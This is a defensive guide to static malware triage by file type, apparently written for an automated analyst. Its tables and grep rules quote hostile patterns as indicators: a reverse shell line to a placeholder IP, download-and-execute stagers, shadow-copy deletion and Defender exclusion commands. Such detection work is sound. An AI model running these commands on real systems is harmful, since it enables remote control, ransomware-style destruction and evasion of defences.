# Static Analysis by Artifact Type

Rule that applies to all: **identify by content, not by extension**, and **never execute**.

```bash
file -b file                # real type
```

---

## PE / EXE / DLL (Windows)

Without `capa`, `pefile` or `Detect It Easy` installed, triage is done with Defender +
signature + strings. If you need to go deeper, propose installing `pefile` (`pip install pefile`)
— it is pure Python and does not execute the sample.

```powershell
Get-FileHash file.exe -Algorithm SHA256
Get-AuthenticodeSignature file.exe | Format-List *
& "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\path\file.exe" -DisableRemediation
```

```bash
strings -n 8 file.exe | sort -u > /tmp/s.txt
grep -inE 'http://|https://|\.onion|\.duckdns|\.ngrok|pastebin|discord.*api|t\.me/' /tmp/s.txt
grep -inE 'VirtualAlloc|WriteProcessMemory|CreateRemoteThread|NtUnmapViewOfSection|SetWindowsHookEx|GetAsyncKeyState|CryptEncrypt|WinHttpOpen|URLDownloadToFile' /tmp/s.txt
grep -inE 'schtasks|reg add|vssadmin|bcdedit|wbadmin|netsh advfirewall|Add-MpPreference' /tmp/s.txt
```

Reading the findings:
- **Few readable strings + high entropy** = packed/encrypted. Not proof of malware
  (UPX, VMProtect and Themida are commercial), but it demands justification. Legitimate
  packed software is usually signed.
- `VirtualAlloc` + `WriteProcessMemory` + `CreateRemoteThread` = process injection
- `GetAsyncKeyState` / `SetWindowsHookEx` = keylogger
- `vssadmin delete shadows` / `bcdedit /set recoveryenabled no` = ransomware destroying recovery
- `Add-MpPreference -ExclusionPath` = trying to blind Defender
- Crypto wallet strings, `wallet.dat`, `Local State`, `login.json`, browser profile
  paths = infostealer
- Embedded Discord/Telegram/Pastebin URL = cheap C2, very common in commodity stealers

---

## Scripts (PS1, BAT, VBS, JS, PY, SH)

Read as text. Never execute, never `Invoke-Expression`, never `node -e`.

```powershell
Get-Content .\file.ps1 -Raw -TotalCount 200
```

Patterns that demand investigation:

| Pattern | What it means |
|---|---|
| `powershell -enc <b64>` / `-EncodedCommand` | Hidden command — decode it (UTF-16LE) |
| `-w hidden -nop -ep bypass` | Hidden execution without profile/policy — strong red flag |
| `IEX (New-Object Net.WebClient).DownloadString(...)` | Stager: downloads and executes from the network |
| `iwr ... \| iex`, `curl ... \| bash` | Same thing in another syntax |
| `FromBase64String`, `atob(`, `Buffer.from(x,'base64')` | Encoded payload |
| `eval(`, `exec(`, `new Function(`, `child_process` | Dynamic execution |
| `$env:TEMP`, `%APPDATA%`, `/tmp/.` + write | Dropper assembling stage 2 |
| `schtasks /create`, `Run` key, `New-Service`, `crontab -`, `systemd` | Persistence |
| `bash -i >& /dev/tcp/IP/PORT 0>&1`, `nc -e` | Reverse shell |
| `[char]0x`, `-join`, `chr()`, broken-up string concatenation | Anti-detection obfuscation |
| `Add-MpPreference -ExclusionPath` | Disabling defenses |

Safe decoding:

```powershell
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('BASE64'))
```

```bash
echo 'BASE64' | base64 -d | head -c 3000
python3 - <<'EOF'
import base64
print(base64.b64decode("BASE64").decode("utf-8","replace")[:3000])
EOF
```

Or use `scripts/deobfuscate.py`, which resolves chained layers automatically.

---

## Office (DOCX, XLSX, DOC, XLSM)

`x` formats (docx/xlsx) are ZIP. Legacy formats (`doc`/`xls`) are OLE2 and more dangerous.

**A macro only runs if the user clicks "Enable Content".** Never open the sample in Word/Excel.

```bash
file doc.docx                          # should say "Microsoft Word 2007+" / Zip
unzip -l doc.docx                      # vbaProject.bin present = has a macro
unzip -o doc.docx -d /tmp/doc && grep -rniE 'http|Target=' /tmp/doc/word/_rels/ | head
```

Red flags:
- `vbaProject.bin` in a document that should not have a macro
- `.docx` that is actually a renamed `.doc` (disguised OLE2)
- Relationship with `TargetMode="External"` pointing to a URL — template injection / remote template
- Embedded OLE object, `oleObject*.bin`
- DDE / `DDEAUTO` in the XML
- Document that only contains "Enable editing to view" — classic lure

`oletools` (`pip install oletools`, `olevba file.doc`) is the right tool here and does not
execute the macro — propose installing it when the document has `vbaProject.bin`.

---

## PDF

```bash
file doc.pdf
strings doc.pdf | grep -aiE '/JS|/JavaScript|/OpenAction|/AA|/Launch|/EmbeddedFile|/URI|/RichMedia|/SubmitForm' | head -30
strings doc.pdf | grep -aoE 'https?://[^ )>"]+' | sort -u | head -30
```

- `/OpenAction` + `/JS` = executes JavaScript on open
- `/Launch` = tries to run an external program
- `/EmbeddedFile` = file attached inside the PDF
- 1-page PDF, a few KB, with one big URL = pure phishing, no exploit
- Many `stream` objects with unusual filters + tiny PDF = obfuscation

The vast majority of malicious PDFs today are phishing (a link), not exploits. Evaluate the URL
with `references/url-triage.md`.

---

## Archives (ZIP, RAR, 7z, ISO, IMG)

**List before extracting. Extract into an empty, disposable folder.**

```bash
unzip -l file.zip
7z l file.7z 2>/dev/null
mkdir -p /tmp/insp && unzip -o file.zip -d /tmp/insp && find /tmp/insp -type f -exec file {} \;
```

Red flags:
- Password-protected ZIP with the password in the e-mail body = gateway scanner evasion
- A `.lnk`, `.js`, `.vbs`, `.cmd`, `.scr` or `.iso` inside a "document"
- `.iso`/`.img`/`.vhd` attached to an e-mail — used to bypass Windows' MOTW mark
- Double extension or RLO character in the inner name
- Zip slip: entry name containing `../`
- Absurd compression ratio (zip bomb)

`.lnk` deserves a direct read — the command sits in the file:
```bash
strings -n 5 file.lnk | grep -iE 'powershell|cmd|http|\.exe' | head
```

---

## npm packages

Core risk: `preinstall`/`postinstall`/`prepare` execute code on `npm install`.
**Never install in order to inspect.**

```bash
npm pack name@version         # downloads the tarball WITHOUT running scripts
tar -xzf name-version.tgz -C /tmp/insp
cd /tmp/insp/package
cat package.json              # look at "scripts" first
grep -rnE 'child_process|eval\(|Function\(|atob\(|https?://|process\.env' . | head -40
find . -type f \( -name '*.node' -o -name '*.wasm' -o -name '*.exe' \)
```

- Name resembling a popular package (`crossenv` vs `cross-env`) = typosquatting
- Package published days ago with many downloads = suspicious
- `postinstall` running `curl`/`node -e`/base64 = almost always malicious
- Reading the entire `process.env` + sending it over the network = CI secret exfiltration
- `.node` binary without corresponding source code

## pip packages

`setup.py` executes code at import time and at install time.

```bash
pip download --no-deps --no-binary :all: package -d /tmp/insp   # does not execute setup.py
tar -xzf /tmp/insp/*.tar.gz -C /tmp/insp
grep -rnE 'os\.system|subprocess|exec\(|eval\(|urllib|requests\.(get|post)|base64' /tmp/insp --include='setup.py' --include='*.py' | head -30
```

A wheel (`.whl`) is a ZIP and does not run `setup.py` — but check `*.dist-info/RECORD` and
any embedded `.so`/`.pyd`.

---

## Docker image

```bash
docker pull image:tag                   # pull executes nothing
docker history --no-trunc image:tag     # each layer and the command that created it
docker save image:tag -o /tmp/img.tar && tar -tf /tmp/img.tar | head
docker inspect image:tag --format '{{json .Config}}' | python3 -m json.tool
```

- `ENTRYPOINT`/`CMD` with `curl ... | sh`
- Layer that adds a binary with no clear origin
- Hardcoded secret in `ENV`
- Image based on a mutable tag from an unknown account
- `USER root` without need + `--privileged` in the compose file

`trivy image image:tag` is the right scanner — if it is not installed, propose installing it.

---

## On entropy and packing

High entropy (~7.5-8.0 bits/byte) means compressed or encrypted data. That is normal in:
installers, media files, commercially packed binaries, resource blobs. It only becomes an
indicator when **there is no reason** for that file to be opaque — a 40-line `.js` with a
high-entropy blob in the middle, or a simple utility `.exe` with no signature and no readable strings.

Never conclude "malicious because the entropy is high". Conclude "I could not analyze the
content — UNKNOWN" and say what is missing.
